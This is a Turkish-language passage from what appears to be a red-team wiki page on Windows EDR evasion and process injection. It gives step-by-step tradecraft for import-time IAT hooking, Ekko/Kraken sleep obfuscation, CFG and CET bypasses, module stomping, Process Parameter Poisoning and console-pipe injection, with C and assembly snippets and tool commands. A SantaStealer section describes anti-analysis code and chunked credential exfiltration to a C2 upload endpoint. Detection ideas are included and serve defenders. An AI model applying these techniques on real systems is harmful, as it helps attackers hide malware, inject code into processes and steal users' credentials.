### Resident PICO üzerinden import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da yaşamaya devam eden bir **resident PICO** (kalıcı PIC nesnesi) oluşturun.
- Loader'ın import resolver'ını değiştiren bir `setup_hooks()` fonksiyonu export edin (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Bir hook varsa onu döndürün; yoksa gerçek `GetProcAddress`'a devredin.
- Hook hedeflerini link time'da Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook resident PICO'nun içinde bulunduğu için geçerliliğini korur.

Bu yöntem, yüklenen DLL'in code section'ını yükleme sonrasında patch'lemeden **import-time IAT yönlendirmesi** sağlar.

### Hedef PEB-walking kullandığında hook'lanabilir import'ları zorlamak

Import-time hook'lar yalnızca fonksiyon hedefin IAT'ında gerçekten bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), loader'ın `ProcessImports()` yolunun bunu görmesi için gerçek bir import zorlayın:

- Hash'lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir ve reflective loader import'ları çözümlerken interception mümkün olur.

### `Sleep()` patch'lemeden Ekko tarzı sleep/idle obfuscation

`Sleep`'i patch'lemek yerine, implantın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun beklemelerde, idle sırasında bellekteki image'ı şifreleyen Ekko tarzı bir obfuscation zinciriyle çağrıyı sarmalayın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue`'ı hazırlanmış `CONTEXT` frame'leriyle çağıran bir dizi callback zamanlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image'ı `PAGE_READWRITE` olarak ayarlayın → tüm eşlenmiş image üzerinde `advapi32!SystemFunction032` aracılığıyla RC4 ile şifreleyin → bloklayan wait işlemini gerçekleştirin → RC4 ile şifreyi çözün → PE section'larını dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir şablon `CONTEXT` sağlar; bunu birden fazla frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: uzun wait'lerde (örn. `WAIT_OBJECT_0`) “success” döndürün; böylece image maskelenmişken çağıran devam eder. Bu yöntem, idle aralıklarında modülü scanner'lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetry tabanlı)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback'lerinin yoğun biçimde görülmesi.
- Büyük, bitişik ve image boyutundaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Büyük aralıklı `VirtualProtect` çağrılarının ardından özel section başına izin geri yükleme işlemleri.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde, `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığından genellikle sürecin `STATUS_STACK_BUFFER_OVERRUN` ile çökmesine neden olur. Ekko/Kraken tarzı zincirlerin harden edilmiş süreçlerde çalışmaya devam etmesi için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image'lardaki (`ntdll`, `kernel32`, `advapi32`) adresler için `MEMORY_RANGE_ENTRY`, **image base**'ten başlamalı ve **image'ın tamamını** kapsamalıdır.
- Manually mapped/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak erişilen export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak saldırgan kontrollü executable section'ları da işaretleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `explorer.exe`, tarayıcılar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint'lerde kullanılabilir bir primitive'e dönüştürür.

### Uyuyan thread'ler için CET-safe stack spoofing

Tam `CONTEXT` değişimi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü sahte `Rip`, donanım shadow stack'iyle eşleşmeye devam etmelidir. Sleep-masking için daha güvenli bir yöntem:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Geçerli thread'in gerçek TEB/TIB'sini yedekleyin.
- `GetThreadContext` ile gerçek uyku bağlamını yakalayın.
- Sahte bağlama yalnızca gerçek `Rip`'i kopyalayın; sahte `Rsp`/stack durumunu olduğu gibi bırakın.
- Sleep aralığında, stack walker'ların meşru bir stack aralığında unwind yapması için spoof thread'in `NT_TIB`'sini geçerli TEB'ye kopyalayın.
- Wait tamamlandıktan sonra özgün TIB ve thread context'ini geri yükleyin.

Bu yöntem CET ile uyumlu bir instruction pointer'ı korurken, unwind doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### APC tabanlı alternatif: Kraken Mask

Timer-queue dispatch fazla imza bırakıyorsa, aynı sleep-encrypt-spoof-restore dizisi queued APC'ler kullanılarak askıya alınmış bir helper thread'den yürütülebilir:<sup>[[27]](#references)</sup>

- Giriş noktası olarak `NtTestAlert` kullanan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir durumunu helper stack'i yerine heap üzerinde saklayın.
- Başlangıç event'ini atomik olarak işaretleyip bloke olmak için `NtSignalAndWaitForSingleObject` kullanın.
- Kısmen geri yüklenmiş bir stack'in scanner tarafından yakalanabileceği race window'u daraltmak için TIB/context'i geri yüklemeden önce ana thread'i askıya alın (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını helper-thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile yapılan `NtSetInformationVirtualMemory` çağrıları.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısını, geçerli thread'in TEB/TIB stack sınırlarına yapılan doğrudan yazımların izlemesi.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerin içinde dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrar tekrar kullanılması.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload'ları hedef süreçte zaten eşlenmiş bir DLL'in **`.text` section'ından** yürütür. Overwrite hedefi, süreç tarafından hâlâ ihtiyaç duyulan code path'leri bozmadan payload'ı barındırabilecek **yüklü, disk-backed bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modülleri gelişigüzel stomp etmek kırılgandır: DLL uzak süreçte yüklü olmayabilir ve çok küçük bir code region sürecin çökmesine neden olabilir. Daha güvenilir bir iş akışı:

1. Hedef süreç modüllerini numaralandırın ve yalnızca zaten yüklü DLL'lerin adlarından oluşan bir include listesi tutun.
2. Önce payload'ı oluşturup **tam byte boyutunu** kaydedin.
3. Aday DLL'leri disk üzerinde tarayın ve PE section'ının **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu değer, executable section'ın **belleğe eşlendiğindeki** boyutunu yansıttığından dosya boyutundan daha önemlidir.
4. **Export Address Table (EAT)**'i ayrıştırın ve stomp başlangıç offset'i olarak bir exported function RVA seçin.
5. **Blast radius**'u hesaplayın: payload seçilen function boundary'yi aşarsa, bellekte ondan sonra yer alan bitişik export'ların üzerine yazılır.

Sahada görülen yaygın recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- `LoadLibrary`/unexpected image loads telemetrisinden kaçınmak için uzak süreçte **zaten yüklenmiş** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal kod yolları, thread oluşturulmadan önce veya sonra stomp edilmiş baytlara erişebilir.
- Büyük implantlarda, tam buffer'ın injector kaynak kodunda doğru şekilde temsil edilmesi için shellcode gömmeyi string literal yerine **byte-array/braced initializer** kullanacak şekilde değiştirmek gerekir.

Detection ideas
- Daha yaygın private RWX/RX allocation'ları yerine **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) üzerine yapılan remote write'lar.
- Bellekteki baytları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk baytları kısa süre önce değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` sayfalarına yönelik, ardından thread oluşturulmasıyla devam eden şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolunu (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe bayt kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalamasından** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklamasından yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleği** göstermelidir ve null terminator dahil en fazla **32,767 Unicode karakter** olabilir.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak ayrılmıştır; bu nedenle `ShellInfo` eşlemesi, belgelenmiş kararlı bir sözleşme yerine bir implementasyon ayrıntısı olarak değerlendirilmelidir.

Bu yaklaşım, normal process oluşturmayı **payload-transfer primitive**'ine dönüştürür. Operator, attacker-controlled başlangıç verileriyle child process'i oluşturur ve cross-process kopyalamayı Windows'un yapmasını sağlar.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **read-only** primitive'lerle bulabilirsiniz:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini al
2. Remote `PEB`'i oku
3. `PEB.ProcessParameters`'ı takip et
4. `RTL_USER_PROCESS_PARAMETERS`'ı oku
5. Seçilen pointer'ı kullan:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre arabelleğinin yürütülmesi

Kopyalanan parametre bölgesi genellikle `RW` olur, yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen ana iş parçacığı tanıtıcısını yeniden kullanın
4. `NtSetContextThread` ile yürütmeyi yönlendirin (`CONTEXT_CONTROL`, `RIP`'nin üzerine yazın)

Klasik thread hijacking iş akışlarından farklı olarak bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; döndürülen ana iş parçacığı tanıtıcısında bağlam doğrudan değiştirilebilir.

Bu yöntem, enjeksiyon için yaygın olarak izlenen çeşitli API'lerden kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null-byte sınırlaması ve aşamalı shellcode

Her üç taşıyıcı da **dize veya dize benzeri veriler** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Uygulanabilir bir çözüm, çalışma zamanında sabitleri yeniden oluşturan ve ardından isteğe bağlı ikinci bir aşamayı yükleyen **null içermeyen bir ilk aşamadır**.

Basit bir yöntem, XOR tabanlı sabit sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack üzerinde dizeler, API argümanları, DLL yolları veya ikinci aşama shellcode loader oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- hedef stack'e dizeyi/buffer'ı push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göreli pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

İkinci aşama daha sonra stack'ten bir `PAGE_READWRITE` tahsisine kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX tahsisinden kaçınarak buraya atlanabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory`
- bu koruma değişikliğini izleyen `SetThreadContext` / `NtSetContextThread`
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için uzaktaki okumalar
- süreç oluşturma sırasında alışılmadık derecede uzun veya yüksek entropili `lpCommandLine`, `lpEnvironment` ya da `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, **süreçler arası bir aktarım numarasıdır**; tek başına tam bir execution primitive değildir: kopyalanan parametre yine de execute izninin değiştirilmesini ve bir execution redirection yöntemi gerektirir.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlarca değerlendirilmiş, ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere başvurduğu için reddedilmiştir.

## Console STDIN pipe injection

Etkileşimli bir console child, **payload aktarım primitive'i** olarak da kullanılabilir. Injector, child'ın standard input'unu bir pipe'a yönlendirir ve bir marker'ın ardından shellcode gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'ini buraya yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler, ancak yine de genel bir EDR bypass değil, process injection'dır.<sup>[[41]](#references)</sup>

"Named-pipe" tanımına rağmen referans implementasyonu `CreatePipe` çağırır; bu, **anonymous pipe** oluşturur. Windows, anonymous pipe'ları dahili olarak benzersiz adlı pipe nesneleriyle uygular; ancak PoC ne `\\.\pipe\<name>` yolu seçer ne de `CreateNamedPipe` çağırır. Varsayılan bir security descriptor ile inherit edilebilir handle'lar oluşturur, read handle'ı `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarını yapar ve handle inheritance etkinleştirilmiş şekilde yeni bir child başlatır. Dolayısıyla bu PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir sürece bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Implementasyon şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT`'u için anonymous pipe çiftleri oluştur. Parent tarafındaki iki handle'da inheritance'ı temizle ve süreç oluşturulduktan sonra child tarafındaki kopyaları parent'ta kapat.
2. `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable'ı `CREATE_NEW_CONSOLE` ile başlat. Child, yönlendirilmiş standard handle'ları devralır.
3. Tam `rawData` binary array'ini parent tarafındaki `STDIN` handle'ı üzerinden `WriteFile` ile gönder. Console programı byte'ları tüketir ve kopyasını kendi özel commit edilmiş bölgelerinden birinde bırakır.
4. Child'ın adres alanında `VirtualQueryEx` ile gezin, aday `MEM_PRIVATE` bölgelerini `ReadProcessMemory` ile oku ve `rawData`'nın başlangıcındaki marker'ı ara.
5. Bulunan buffer'ın korumasını `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştir.
6. Ana thread'i belirle, askıya al, `NtSetContextThread` ile `RIP` değerini `found_address + 0x19` olarak ayarla ve thread'i devam ettir.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özgüdür: `CONTEXT.Rip` alanını değiştirir ve gömülü payload'u x64 shellcode'dur. `rawData`, 25 baytlık bir işaretçiyle başlar; bu nedenle çalıştırılabilir baytlar onaltılık `0x19` ofsetinde başlar. Payload'u değiştirirken bu düzeni koruyun veya işaretçiyi, arama vektörünü, dizi boyutunu ve çalıştırma ofsetini birlikte güncelleyin. Kaynak yorumlarında `0x0A`, `0x0D` ve `0x1A` da geçersiz karakterler olarak listelenmiştir. Bu iş akışı, alt sürecin token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük yerel yardımcılar ve payload derleme kalıpları için [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) sayfasına bakın.

## Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için SantaStealer Taktikleri

SantaStealer (diğer adıyla BluelineStealer), modern bilgi hırsızlarının AV bypass, analiz karşıtı teknikleri ve kimlik bilgilerine erişimi tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Klavye düzeni denetimi ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Kiril alfabesi kullanan bir düzen bulunursa örnek, boş bir `CIS` işaretçisi bırakıp hırsızları çalıştırmadan önce sonlanır; böylece hariç tutulan yerel ayarlarda hiçbir zaman etkinleşmezken avlama için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- A varyantı süreç listesini tarar, her adı özel bir döngüsel sağlama toplamıyla hash'ler ve sonucu hata ayıklayıcılar/kum havuzları için gömülü engelleme listeleriyle karşılaştırır; bilgisayar adı üzerinde sağlama toplamını tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- B varyantı sistem özelliklerini inceler (asgari süreç sayısı, yakın zamandaki çalışma süresi), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve tek adımlı yürütmeyi saptamak için uyku işlemlerinin çevresinde zamanlama kontrolleri gerçekleştirir. Herhangi bir bulgu, modüller başlatılmadan önce işlemi durdurur.

### Disksiz yardımcı + çift ChaCha20 yansıtmalı yükleme

- Ana DLL/EXE, diske bırakılan veya belleğe elle eşlenen bir Chromium kimlik bilgisi yardımcısı içerir; diske yazmadan çalışan kipte, hiçbir yardımcı dosyası oluşturulmasın diye içe aktarımları/relokasyonları kendisi çözümler.
- Bu yardımcı, ikinci aşama bir DLL'i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme geçişinin ardından blob'u yansıtmalı olarak yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dışa aktarımlarını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator yordamları, canlı bir Chromium tarayıcısına kod enjekte etmek, AppBound Encryption anahtarlarını devralmak ve ABE güçlendirmesine rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartlarını doğrudan çözmek için doğrudan sistem çağrıları kullanan yansıtmalı süreç boşaltma tekniğinden yararlanır.

### Modüler bellek içi toplama ve parçalı HTTP dışarı sızdırma

- `create_memory_based_log`, genel bir `memory_generators` işlev işaretçisi tablosunu yineler ve etkin her modül için bir iş parçacığı başlatır (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı eklentileri vb.). Her iş parçacığı sonuçları paylaşılan arabellek yazıp yaklaşık 45 saniyelik bir bekleme penceresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statik olarak bağlanmış `miniz` kitaplığıyla `%TEMP%\\Log.zip` dosyasına sıkıştırılır. Ardından `ThreadPayload1` 15 saniye uyur ve arşivi HTTP POST ile `http://<C2>:6767/upload` adresine 10 MB'lık parçalar hâlinde gönderir; tarayıcıya ait bir `multipart/form-data` sınırını taklit eder (`----WebKitFormBoundary***`). Her parçaya `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı olarak `w: <campaign_tag>` eklenir; son parçaya ise C2'nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Kaçınma Taktikleri: Hassas Modül Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Çağrı yığınları: kötü amaçlı yazılımlara artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – belgeler](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – çağrı yığını sahteciliği PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni bulaşma zinciri ve ConfuserEx tabanlı gizleme](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sıfır güveninize güvenmeli misiniz? Zscaler duruş kontrollerini aşma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell'den önce: Storm-2603'ün önceki fidye yazılımı operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Yönlendirilen dışa aktarımları kötüye kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 yönlendirilen dışa aktarımlar envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dinamik bağlantı kitaplığı arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL başlatıcısı](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'larla mücadele](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Klasör yönlendirme tekniğiyle Windows Defender'ın koruyucu kabuğunu aşma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Saf perdenin ardında: RAT'ten derleyiciye, oradan kodlayıcıya](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir bilgi hırsızı](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption şifre çözme](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API izleme ile Node.js kötü amaçlı yazılımlarını etkisizleştirme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uyuyan Güzel: Crystal Palace ile Adaptix'i uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Süreç parametresi zehirleme](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uyuyan Güzel II: CFG, CET ve yığın sahteciliği](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko uyku gizleme](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW'nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kırmızı takım operasyonlarında Chrome Remote Desktop'ı kötüye kullanma: Uygulamalı bir kılavuz](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender'ın düzeltme sürücüsünü çekirdek işlemi ilkel aracı olarak silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo eşlikçi kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak kendini maskeleyen işlevler oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe işlevi](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş girdi ve çıktı ile alt süreç oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge ile C# araçlarını yeniden biçimlendirme](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET projelerini derleme](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
{{#include ../banners/hacktricks-training.md}}
